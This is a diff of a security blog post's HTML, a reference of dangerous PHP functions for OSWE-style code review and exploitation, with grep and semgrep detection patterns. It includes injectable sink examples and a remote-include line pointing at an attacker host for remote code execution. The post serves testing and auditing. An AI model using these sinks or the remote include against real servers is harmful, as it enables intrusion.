@@ -6,8 +6,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>Dangerous PHP Functions: Code Execution and Exploitation Reference | z-r0crypt</title>
-<meta name="keywords" content="oswe, awae, php, rce, web-security, code-execution">
-<meta name="description" content="Comprehensive catalog of PHP functions exploitable for RCE, file manipulation, and information disclosure in OSWE/AWAE assessments.">
+<meta name="keywords" content="oswe, awae, php, rce, web-security, code-execution, code-review, semgrep">
+<meta name="description" content="Complete reference of PHP functions exploitable for RCE, LFI, information disclosure and filesystem manipulation. Includes grep and semgrep patterns for source code review, PHP version notes, and exploitation context for OSWE/AWAE.">
 <meta name="author" content="z-r0crypt">
 <link rel="canonical" href="https://z-r0crypt.github.io/posts/2021-01-25-dangerous-php-functions/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.89a586cd7f95d558941ab561d0e1abd0c06e69b984365426c7d9c56b8dd255a0.css" integrity="sha256-iaWGzX&#43;V1ViUGrVh0OGr0MBuabmENlQmx9nFa43SVaA=" rel="preload stylesheet" as="style">
@@ -55,14 +55,14 @@
       </script><meta property="og:url" content="https://z-r0crypt.github.io/posts/2021-01-25-dangerous-php-functions/">
   <meta property="og:site_name" content="z-r0crypt">
   <meta property="og:title" content="Dangerous PHP Functions: Code Execution and Exploitation Reference">
-  <meta property="og:description" content="Comprehensive catalog of PHP functions exploitable for RCE, file manipulation, and information disclosure in OSWE/AWAE assessments.">
+  <meta property="og:description" content="Complete reference of PHP functions exploitable for RCE, LFI, information disclosure and filesystem manipulation. Includes grep and semgrep patterns for source code review, PHP version notes, and exploitation context for OSWE/AWAE.">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2021-01-25T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-01-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-13T00:00:00+00:00">
     <meta property="article:tag" content="OSWE">
-    <meta property="article:tag" content="AWAE">
+    <meta property="article:tag" content="Awae">
     <meta property="article:tag" content="Php">
     <meta property="article:tag" content="Rce">
     <meta property="article:tag" content="Web-Security">
@@ -70,7 +70,7 @@
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Dangerous PHP Functions: Code Execution and Exploitation Reference">
-  <meta name="twitter:description" content="Comprehensive catalog of PHP functions exploitable for RCE, file manipulation, and information disclosure in OSWE/AWAE assessments.">
+  <meta name="twitter:description" content="Complete reference of PHP functions exploitable for RCE, LFI, information disclosure and filesystem manipulation. Includes grep and semgrep patterns for source code review, PHP version notes, and exploitation context for OSWE/AWAE.">
 
 
 <script type="application/ld+json">
@@ -99,15 +99,15 @@
   "@type": "BlogPosting",
   "headline": "Dangerous PHP Functions: Code Execution and Exploitation Reference",
   "name": "Dangerous PHP Functions: Code Execution and Exploitation Reference",
-  "description": "Comprehensive catalog of PHP functions exploitable for RCE, file manipulation, and information disclosure in OSWE/AWAE assessments.",
+  "description": "Complete reference of PHP functions exploitable for RCE, LFI, information disclosure and filesystem manipulation. Includes grep and semgrep patterns for source code review, PHP version notes, and exploitation context for OSWE/AWAE.",
   "keywords": [
-    "oswe", "awae", "php", "rce", "web-security", "code-execution"
+    "oswe", "awae", "php", "rce", "web-security", "code-execution", "code-review", "semgrep"
   ],
-  "articleBody": "Purpose: Reference guide for identifying and exploiting PHP vulnerabilities during web application penetration testing.\nUsage: Search by attack vector (RCE, LFI, information disclosure) for your target function.\nCommand Execution exec - Returns last line of commands output passthru - Passes commands output directly to the browser system - Passes commands output directly to the browser and returns last line shell_exec - Returns commands output \\`\\` (backticks) - Same as shell_exec() popen - Opens read or write pipe to process of a command proc_open - Similar to popen() but greater degree of control pcntl_exec - Executes a program PHP Code Execution Apart from eval there are other ways to execute PHP code: include/require can be used for remote code execution in the form of Local File Include and Remote File Include vulnerabilities.\neval() assert() - identical to eval() preg_replace('/.*/e',...) - /e does an eval() on the match create_function() include() include_once() require() require_once() $_GET['func_name']($_GET['argument']); $func = new ReflectionFunction($_GET['func_name']); $func-\u003einvoke(); or $func-\u003einvokeArgs(array()); List of functions which accept callbacks These functions accept a string parameter which could be used to call a function of the attacker’s choice. Depending on the function the attacker may or may not have the ability to pass a parameter. In that case an Information Disclosure function like phpinfo() could be used.\nFunction =\u003e Position of callback arguments 'ob_start' =\u003e 0, 'array_diff_uassoc' =\u003e -1, 'array_diff_ukey' =\u003e -1, 'array_filter' =\u003e 1, 'array_intersect_uassoc' =\u003e -1, 'array_intersect_ukey' =\u003e -1, 'array_map' =\u003e 0, 'array_reduce' =\u003e 1, 'array_udiff_assoc' =\u003e -1, 'array_udiff_uassoc' =\u003e array(-1, -2), 'array_udiff' =\u003e -1, 'array_uintersect_assoc' =\u003e -1, 'array_uintersect_uassoc' =\u003e array(-1, -2), 'array_uintersect' =\u003e -1, 'array_walk_recursive' =\u003e 1, 'array_walk' =\u003e 1, 'assert_options' =\u003e 1, 'uasort' =\u003e 1, 'uksort' =\u003e 1, 'usort' =\u003e 1, 'preg_replace_callback' =\u003e 1, 'spl_autoload_register' =\u003e 0, 'iterator_apply' =\u003e 1, 'call_user_func' =\u003e 0, 'call_user_func_array' =\u003e 0, 'register_shutdown_function' =\u003e 0, 'register_tick_function' =\u003e 0, 'set_error_handler' =\u003e 0, 'set_exception_handler' =\u003e 0, 'session_set_save_handler' =\u003e array(0, 1, 2, 3, 4, 5), 'sqlite_create_aggregate' =\u003e array(2, 3), 'sqlite_create_function' =\u003e 2, Information Disclosure Most of these function calls are not sinks. But rather it maybe a vulnerability if any of the data returned is viewable to an attacker. If an attacker can see phpinfo() it is definitely a vulnerability.\nphpinfo posix_mkfifo posix_getlogin posix_ttyname getenv get_current_user proc_get_status get_cfg_var disk_free_space disk_total_space diskfreespace getcwd getlastmo getmygid getmyinode getmypid getmyuid Other extract - Opens the door for register_globals attacks (see [study in scarlet - seclist](http://seclists.org/bugtraq/2001/Jul/att-26/studyinscarlet.txt)). parse_str - works like extract if only one argument is given. putenv ini_set mail - has CRLF injection in the 3rd parameter, opens the door for spam. header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header(\"location: ...\"); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. proc_nice proc_terminate proc_close pfsockopen fsockopen apache_child_terminate posix_kill posix_mkfifo posix_setpgid posix_setsid posix_setuid Filesystem Functions According to RATS all filesystem functions in php are nasty. Some of these don’t seem very useful to the attacker. Others are more useful than you might think. For instance if allow_url_fopen=On then a url can be used as a file path, so a call to copy($_GET['s'], $_GET['d']); can be used to upload a PHP script anywhere on the system. Also if a site is vulnerable to a request send via GET everyone of those file system functions can be abused to channel and attack to another host through your server.\n// open filesystem handler fopen tmpfile bzopen gzopen SplFileObject-\u003e__construct // write to filesystem (partially in combination with reading) chgrp chmod chown copy file_put_contents lchgrp lchown link mkdir move_uploaded_file rename rmdir symlink tempnam touch unlink imagepng - 2nd parameter is a path. imagewbmp - 2nd parameter is a path. image2wbmp - 2nd parameter is a path. imagejpeg - 2nd parameter is a path. imagexbm - 2nd parameter is a path. imagegif - 2nd parameter is a path. imagegd - 2nd parameter is a path. imagegd2 - 2nd parameter is a path. iptcembed ftp_get ftp_nb_get // read from filesystem file_exists file_get_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype glob is_dir is_executable is_file is_link is_readable is_uploaded_file is_writable is_writeable linkinfo lstat parse_ini_file pathinfo readfile readlink realpath stat gzfile readgzfile getimagesize imagecreatefromgif imagecreatefromjpeg imagecreatefrompng imagecreatefromwbmp imagecreatefromxbm imagecreatefromxpm ftp_put ftp_nb_put exif_read_data read_exif_data exif_thumbnail exif_imagetype hash_file hash_hmac_file hash_update_file md5_file sha1_file highlight_file show_source php_strip_whitespace get_meta_tags Reference - https://stackoverflow.com/a/3697776 ",
-  "wordCount" : "735",
+  "articleBody": "Overview This is a reference for identifying and exploiting dangerous PHP functions during white-box web application penetration testing. Originally compiled during OSWE/AWAE preparation, updated with code review patterns and PHP version notes.\nHow to use this post:\nDuring source code review — use the grep/semgrep patterns to find sinks quickly During exploitation — use the function descriptions to understand what’s exploitable and how During OSWE exam — functions here are exactly what you’re hunting for in each target application Attribution: Core function list adapted from OWASP PHP Security Cheat Sheet and StackOverflow. Code review patterns and version notes added here.\nFinding These Functions: grep and Semgrep Patterns Before diving into the function list, here are the patterns to use during code review.\nQuick grep — find all dangerous function calls # Command execution functions grep -rn \"exec\\|passthru\\|system\\|shell_exec\\|popen\\|proc_open\\|pcntl_exec\" \\ --include=\"*.php\" /path/to/source/ # Code execution / eval sinks grep -rn \"eval\\|assert\\|create_function\\|preg_replace\" \\ --include=\"*.php\" /path/to/source/ # File inclusion sinks (LFI/RFI) grep -rn \"include\\|require\\|include_once\\|require_once\" \\ --include=\"*.php\" /path/to/source/ # User input reaching dangerous functions (taint) grep -rn \"\\$_GET\\|\\$_POST\\|\\$_REQUEST\\|\\$_COOKIE\\|\\$_SERVER\" \\ --include=\"*.php\" /path/to/source/ | grep -i \"exec\\|eval\\|system\\|include\" # Callbacks with user input grep -rn \"call_user_func\\|array_map\\|array_filter\\|usort\\|preg_replace_callback\" \\ --include=\"*.php\" /path/to/source/ Semgrep — semantic pattern matching Install: pip install semgrep\n# Run official PHP security ruleset semgrep --config \"p/php\" /path/to/source/ # Run with community security rules semgrep --config \"p/security-audit\" /path/to/source/ # Target only RCE sinks semgrep --config r/php.lang.security.exec-use /path/to/source/ Custom semgrep rule to find user input reaching exec:\nrules: - id: user-input-to-exec languages: [php] severity: ERROR message: User input reaches exec() - potential RCE patterns: - pattern: exec($INPUT, ...) - pattern-either: - pattern: $INPUT = $_GET[...] - pattern: $INPUT = $_POST[...] - pattern: $INPUT = $_REQUEST[...] Save as rce.yml and run: semgrep --config rce.yml /path/to/source/\nSeverity Reference Quick triage guide — not all dangerous functions are equally exploitable:\nSeverity Functions Why CRITICAL eval, assert, system, exec, passthru, shell_exec, backticks Direct code/command execution with user input = instant RCE CRITICAL include, require + user input LFI to RCE if log poisoning or file upload possible HIGH preg_replace with /e (PHP \u003c 7.0) Eval on regex match — removed in PHP 7 HIGH create_function (PHP \u003c 8.0) Wrapper for eval — removed in PHP 8 HIGH call_user_func, array_map, usort + user-controlled callback Callback injection MEDIUM file_put_contents, move_uploaded_file, copy Arbitrary file write — RCE if webroot writable MEDIUM unserialize PHP object injection — see deserialization attacks LOW phpinfo, getenv, get_cfg_var Information disclosure only Command Execution Direct OS command execution. If any of these receive unsanitised user input, it is RCE.\nexec() // Returns last line of output — no direct output to browser passthru() // Passes raw output directly to browser — useful for binary output system() // Passes output to browser AND returns last line shell_exec() // Returns entire output as a string `` // Backtick operator — identical to shell_exec() popen() // Opens a pipe to a process — read or write proc_open() // Like popen() but with more control over stdin/stdout/stderr pcntl_exec() // Executes a program, replacing current process PHP version notes:\nAll functions above exist in PHP 5, 7, and 8 pcntl_exec() requires the pcntl extension — not enabled by default on Windows Exploitation context: If you find system($_GET['cmd']) or similar, you have immediate RCE. Look for user input flowing into any of these via variable assignment, string concatenation, or function return values.\nPHP Code Execution These functions evaluate PHP code at runtime. User input reaching these = RCE.\neval() // Executes string as PHP code assert() // In PHP \u003c 8: identical to eval() when passed a string preg_replace('/.*/e', $input, ...) // /e modifier evals the replacement — REMOVED in PHP 7.0 create_function() // Creates anonymous function via eval — REMOVED in PHP 8.0 include($input) // Executes included file as PHP — LFI/RFI if user-controlled include_once($input) require($input) require_once($input) $_GET['func_name']($_GET['argument']) // Dynamic function call — common in poorly written apps $func = new ReflectionFunction($_GET['func_name']); $func-\u003einvoke(); PHP version compatibility:\nFunction PHP 5 PHP 7 PHP 8 eval() yes yes yes assert() as eval yes deprecated removed preg_replace /e yes removed in 7.0 no create_function() yes deprecated removed in 8.0 Exploitation context: assert() deserves special attention — in PHP 5 and early PHP 7, passing a string to assert() evaluates it as PHP code. This is frequently missed in code review because developers use it for debugging. Look for assert($input) with any user-controlled $input.\nCallback Functions These functions accept a callable as a parameter. If the callable is user-controlled, it can be used to call arbitrary functions including phpinfo(), system(), or eval().\n// Common callback sinks call_user_func($callback, $arg) // Calls $callback with $arg call_user_func_array($callback, $args) // Calls $callback with array of args array_map($callback, $array) // Applies $callback to each element array_filter($array, $callback) // Filters using $callback usort($array, $callback) // Sorts using $callback comparator uasort($array, $callback) uksort($array, $callback) preg_replace_callback($pattern, $callback, $subject) array_walk($array, $callback) array_walk_recursive($array, $callback) // Less obvious callback sinks ob_start($callback) // Output buffer handler register_shutdown_function($callback) // Called on script termination register_tick_function($callback) // Called on each tick set_error_handler($callback) // Custom error handler set_exception_handler($callback) // Custom exception handler spl_autoload_register($callback) // Autoloader registration iterator_apply($iterator, $callback) // Callback argument positions (for manual analysis) 'ob_start' =\u003e 0 'array_filter' =\u003e 1 'array_map' =\u003e 0 'array_reduce' =\u003e 1 'array_walk' =\u003e 1 'call_user_func' =\u003e 0 'call_user_func_array' =\u003e 0 'usort' =\u003e 1 'preg_replace_callback' =\u003e 1 'session_set_save_handler' =\u003e array(0, 1, 2, 3, 4, 5) Exploitation context: If you find call_user_func($_GET['func'], $_GET['arg']), you can call system with any command. Even without argument control, calling phpinfo confirms the vulnerability. During OSWE, look for deserialization gadget chains that terminate in callback functions.\nInformation Disclosure These don’t provide code execution directly but leak configuration, paths, and credentials useful for chaining attacks.\nphpinfo() // Full PHP configuration — reveals paths, extensions, disable_functions getenv() // Read environment variables — may contain DB passwords, API keys get_cfg_var() // Read php.ini values get_current_user() // Returns username of PHP process owner getcwd() // Current working directory — reveals webroot path disk_free_space() disk_total_space() proc_get_status() // Information about process opened by proc_open() posix_getlogin() // Username of process posix_ttyname() // Terminal device name getlastmo() // Last modification time of page getmygid() // GID of PHP process getmyinode() // Inode of current script getmypid() // PID of PHP process getmyuid() // UID of PHP process Exploitation context: phpinfo() exposed publicly is always a finding. It reveals disable_functions (what’s blocked), open_basedir (path restrictions), server paths, and loaded extensions. This directly informs your exploitation approach when other functions are disabled.\nFilesystem Functions Write operations — arbitrary file write to webroot = RCE:\nfile_put_contents($path, $data) // Write data to file — RCE if webroot writable move_uploaded_file($tmp, $dest) // Move uploaded file — file upload bypass copy($src, $dest) // Copy file — with allow_url_fopen: copy remote PHP to webroot rename($old, $new) // Rename/move file symlink($target, $link) // Create symlink — path traversal amplifier touch($path) // Create empty file unlink($path) // Delete file — denial of service mkdir($path) // Create directory chmod($path, $mode) // Change permissions chown($path, $user) // Change ownership Read operations — information disclosure, LFI:\nfile_get_contents($path) // Read file contents — LFI if user-controlled file($path) // Read file into array readfile($path) // Output file contents directly highlight_file($path) // Output file with syntax highlighting — shows source show_source($path) // Alias for highlight_file() parse_ini_file($path) // Parse .ini file — read config files glob($pattern) // Find files matching pattern — directory listing fopen($path, $mode) // Open file handle PHP version notes:\nallow_url_fopen and allow_url_include control whether URLs can be used as file paths — disabled by default in modern PHP but worth checking in older applications If allow_url_include=On, include('http://attacker.com/shell.php') gives RFI to RCE Exploitation context: copy($_GET['s'], $_GET['d']) with allow_url_fopen=On allows copying a remote PHP file to the webroot. Also look for file_put_contents with user-controlled filename — if you can write a .php file to the webroot, you have RCE.\nOther Notable Functions extract($array) // Imports array keys as variables — register_globals-style vuln parse_str($string) // Parses query string into variables — same risk as extract() putenv($setting) // Set environment variable — can affect child process behaviour ini_set($key, $val) // Change php.ini at runtime — can re-enable dangerous settings mail($to, $subj, $body, $headers) // CRLF injection in 5th param header($string) // CRLF injection in older PHP — XSS or header injection unserialize($data) // PHP object injection — see deserialization attacks Exploitation context: extract($_GET) is particularly dangerous — it turns all GET parameters into local variables, potentially overwriting $admin, $authenticated, or any other variable used in access control logic. Appears frequently in legacy PHP applications.\nCode Review Workflow When auditing a PHP application for OSWE, work in this order:\nFind sinks — grep for dangerous function calls across the codebase Trace backwards — follow the variable back to where user input enters Check sanitisation — look for escapeshellarg(), htmlspecialchars(), intval() between source and sink Identify the chain — what HTTP parameter reaches the sink and how? Automate the exploit — OSWE expects a working end-to-end script, not manual steps # Step 1: Find sinks grep -rn \"system\\|exec\\|eval\\|include\\|shell_exec\" --include=\"*.php\" . \u003e sinks.txt # Step 2: For each sink, find where the argument comes from grep -n \"system(\" . -r --include=\"*.php\" # Step 3: Check if input is sanitised between source and sink grep -rn \"escapeshellarg\\|escapeshellcmd\\|filter_input\\|htmlspecialchars\" \\ --include=\"*.php\" . References OWASP PHP Security Cheat Sheet StackOverflow: PHP dangerous functions — original source for function list Semgrep PHP rules — community ruleset for PHP security PayloadsAllTheThings — Command Injection — exploitation payloads php.net disable_functions — how to check what is blocked ",
+  "wordCount" : "1565",
   "inLanguage": "en",
   "datePublished": "2021-01-25T00:00:00Z",
-  "dateModified": "2025-01-15T00:00:00Z",
+  "dateModified": "2025-06-13T00:00:00Z",
   "author":{
     "@type": "Person",
     "name": "z-r0crypt"
@@ -188,7 +188,7 @@
       Dangerous PHP Functions: Code Execution and Exploitation Reference
     </h1>
     <div class="post-description">
-      Comprehensive catalog of PHP functions exploitable for RCE, file manipulation, and information disclosure in OSWE/AWAE assessments.
+      Complete reference of PHP functions exploitable for RCE, LFI, information disclosure and filesystem manipulation. Includes grep and semgrep patterns for source code review, PHP version notes, and exploitation context for OSWE/AWAE.
     </div>
     <div class="post-meta">
 
@@ -198,199 +198,311 @@
 
 </div>
   </header> 
-  <div class="post-content md-content"><p><strong>Purpose:</strong> Reference guide for identifying and exploiting PHP vulnerabilities during web application penetration testing.</p>
-<p><strong>Usage:</strong> Search by attack vector (RCE, LFI, information disclosure) for your target function.</p>
+  <div class="post-content md-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>This is a reference for identifying and exploiting dangerous PHP functions during white-box web application penetration testing. Originally compiled during OSWE/AWAE preparation, updated with code review patterns and PHP version notes.</p>
+<p><strong>How to use this post:</strong></p>
+<ul>
+<li>During <strong>source code review</strong> — use the grep/semgrep patterns to find sinks quickly</li>
+<li>During <strong>exploitation</strong> — use the function descriptions to understand what&rsquo;s exploitable and how</li>
+<li>During <strong>OSWE exam</strong> — functions here are exactly what you&rsquo;re hunting for in each target application</li>
+</ul>
+<blockquote>
+<p><strong>Attribution:</strong> Core function list adapted from <a href="https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html">OWASP PHP Security Cheat Sheet</a> and <a href="https://stackoverflow.com/a/3697776">StackOverflow</a>. Code review patterns and version notes added here.</p>
+</blockquote>
+<hr>
+<h2 id="finding-these-functions-grep-and-semgrep-patterns">Finding These Functions: grep and Semgrep Patterns<a hidden class="anchor" aria-hidden="true" href="#finding-these-functions-grep-and-semgrep-patterns">#</a></h2>
+<p>Before diving into the function list, here are the patterns to use during code review.</p>
+<h3 id="quick-grep--find-all-dangerous-function-calls">Quick grep — find all dangerous function calls<a hidden class="anchor" aria-hidden="true" href="#quick-grep--find-all-dangerous-function-calls">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Command execution functions</span>
+</span></span><span class="line"><span class="cl">grep -rn <span class="s2">&#34;exec\|passthru\|system\|shell_exec\|popen\|proc_open\|pcntl_exec&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span> /path/to/source/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Code execution / eval sinks</span>
+</span></span><span class="line"><span class="cl">grep -rn <span class="s2">&#34;eval\|assert\|create_function\|preg_replace&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span> /path/to/source/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># File inclusion sinks (LFI/RFI)</span>
+</span></span><span class="line"><span class="cl">grep -rn <span class="s2">&#34;include\|require\|include_once\|require_once&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span> /path/to/source/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># User input reaching dangerous functions (taint)</span>
+</span></span><span class="line"><span class="cl">grep -rn <span class="s2">&#34;\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\$_SERVER&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span> /path/to/source/ <span class="p">|</span> grep -i <span class="s2">&#34;exec\|eval\|system\|include&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Callbacks with user input</span>
+</span></span><span class="line"><span class="cl">grep -rn <span class="s2">&#34;call_user_func\|array_map\|array_filter\|usort\|preg_replace_callback&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span> /path/to/source/
+</span></span></code></pre></div><h3 id="semgrep--semantic-pattern-matching">Semgrep — semantic pattern matching<a hidden class="anchor" aria-hidden="true" href="#semgrep--semantic-pattern-matching">#</a></h3>
+<p>Install: <code>pip install semgrep</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run official PHP security ruleset</span>
+</span></span><span class="line"><span class="cl">semgrep --config <span class="s2">&#34;p/php&#34;</span> /path/to/source/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Run with community security rules</span>
+</span></span><span class="line"><span class="cl">semgrep --config <span class="s2">&#34;p/security-audit&#34;</span> /path/to/source/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Target only RCE sinks</span>
+</span></span><span class="line"><span class="cl">semgrep --config r/php.lang.security.exec-use /path/to/source/
+</span></span></code></pre></div><p>Custom semgrep rule to find user input reaching <code>exec</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">rules</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l">user-input-to-exec</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">languages</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="l">php]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l">ERROR</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">message</span><span class="p">:</span><span class="w"> </span><span class="l">User input reaches exec() - potential RCE</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">patterns</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="nt">pattern</span><span class="p">:</span><span class="w"> </span><span class="l">exec($INPUT, ...)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="nt">pattern-either</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="nt">pattern</span><span class="p">:</span><span class="w"> </span><span class="l">$INPUT = $_GET[...]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="nt">pattern</span><span class="p">:</span><span class="w"> </span><span class="l">$INPUT = $_POST[...]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="nt">pattern</span><span class="p">:</span><span class="w"> </span><span class="l">$INPUT = $_REQUEST[...]</span><span class="w">
+</span></span></span></code></pre></div><p>Save as <code>rce.yml</code> and run: <code>semgrep --config rce.yml /path/to/source/</code></p>
+<hr>
+<h2 id="severity-reference">Severity Reference<a hidden class="anchor" aria-hidden="true" href="#severity-reference">#</a></h2>
+<p>Quick triage guide — not all dangerous functions are equally exploitable:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Severity</th>
+          <th>Functions</th>
+          <th>Why</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>CRITICAL</td>
+          <td><code>eval</code>, <code>assert</code>, <code>system</code>, <code>exec</code>, <code>passthru</code>, <code>shell_exec</code>, backticks</td>
+          <td>Direct code/command execution with user input = instant RCE</td>
+      </tr>
+      <tr>
+          <td>CRITICAL</td>
+          <td><code>include</code>, <code>require</code> + user input</td>
+          <td>LFI to RCE if log poisoning or file upload possible</td>
+      </tr>
+      <tr>
+          <td>HIGH</td>
+          <td><code>preg_replace</code> with <code>/e</code> (PHP &lt; 7.0)</td>
+          <td>Eval on regex match — removed in PHP 7</td>
+      </tr>
+      <tr>
+          <td>HIGH</td>
+          <td><code>create_function</code> (PHP &lt; 8.0)</td>
+          <td>Wrapper for eval — removed in PHP 8</td>
+      </tr>
+      <tr>
+          <td>HIGH</td>
+          <td><code>call_user_func</code>, <code>array_map</code>, <code>usort</code> + user-controlled callback</td>
+          <td>Callback injection</td>
+      </tr>
+      <tr>
+          <td>MEDIUM</td>
+          <td><code>file_put_contents</code>, <code>move_uploaded_file</code>, <code>copy</code></td>
+          <td>Arbitrary file write — RCE if webroot writable</td>
+      </tr>
+      <tr>
+          <td>MEDIUM</td>
+          <td><code>unserialize</code></td>
+          <td>PHP object injection — see deserialization attacks</td>
+      </tr>
+      <tr>
+          <td>LOW</td>
+          <td><code>phpinfo</code>, <code>getenv</code>, <code>get_cfg_var</code></td>
+          <td>Information disclosure only</td>
+      </tr>
+  </tbody>
+</table>
 <hr>
 <h2 id="command-execution">Command Execution<a hidden class="anchor" aria-hidden="true" href="#command-execution">#</a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">exec</span>           <span class="o">-</span> <span class="nx">Returns</span> <span class="nx">last</span> <span class="nx">line</span> <span class="nx">of</span> <span class="nx">commands</span> <span class="nx">output</span>
-</span></span><span class="line"><span class="cl"><span class="nx">passthru</span>       <span class="o">-</span> <span class="nx">Passes</span> <span class="nx">commands</span> <span class="nx">output</span> <span class="nx">directly</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">browser</span>
-</span></span><span class="line"><span class="cl"><span class="nx">system</span>         <span class="o">-</span> <span class="nx">Passes</span> <span class="nx">commands</span> <span class="nx">output</span> <span class="nx">directly</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">browser</span> <span class="k">and</span> <span class="nx">returns</span> <span class="nx">last</span> <span class="nx">line</span>
-</span></span><span class="line"><span class="cl"><span class="nx">shell_exec</span>     <span class="o">-</span> <span class="nx">Returns</span> <span class="nx">commands</span> <span class="nx">output</span>
-</span></span><span class="line"><span class="cl"><span class="nx">\</span><span class="err">`</span><span class="nx">\</span><span class="err">`</span> <span class="p">(</span><span class="nx">backticks</span><span class="p">)</span> <span class="o">-</span> <span class="nx">Same</span> <span class="k">as</span> <span class="nx">shell_exec</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="nx">popen</span>          <span class="o">-</span> <span class="nx">Opens</span> <span class="nx">read</span> <span class="k">or</span> <span class="nx">write</span> <span class="nx">pipe</span> <span class="nx">to</span> <span class="nx">process</span> <span class="nx">of</span> <span class="nx">a</span> <span class="nx">command</span>
-</span></span><span class="line"><span class="cl"><span class="nx">proc_open</span>      <span class="o">-</span> <span class="nx">Similar</span> <span class="nx">to</span> <span class="nx">popen</span><span class="p">()</span> <span class="nx">but</span> <span class="nx">greater</span> <span class="nx">degree</span> <span class="nx">of</span> <span class="nx">control</span>
-</span></span><span class="line"><span class="cl"><span class="nx">pcntl_exec</span>     <span class="o">-</span> <span class="nx">Executes</span> <span class="nx">a</span> <span class="nx">program</span>
-</span></span></code></pre></div><h2 id="php-code-execution">PHP Code Execution<a hidden class="anchor" aria-hidden="true" href="#php-code-execution">#</a></h2>
-<p>Apart from eval there are other ways to execute PHP code: <code>include/require</code> can be used for remote code execution in the form of Local File Include and Remote File Include vulnerabilities.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">eval</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="nx">assert</span><span class="p">()</span>  <span class="o">-</span> <span class="nx">identical</span> <span class="nx">to</span> <span class="k">eval</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/.*/e&#39;</span><span class="p">,</span><span class="o">...</span><span class="p">)</span> <span class="o">-</span> <span class="o">/</span><span class="nx">e</span> <span class="nx">does</span> <span class="nx">an</span> <span class="k">eval</span><span class="p">()</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">match</span>
-</span></span><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="k">require</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;func_name&#39;</span><span class="p">](</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;argument&#39;</span><span class="p">]);</span>
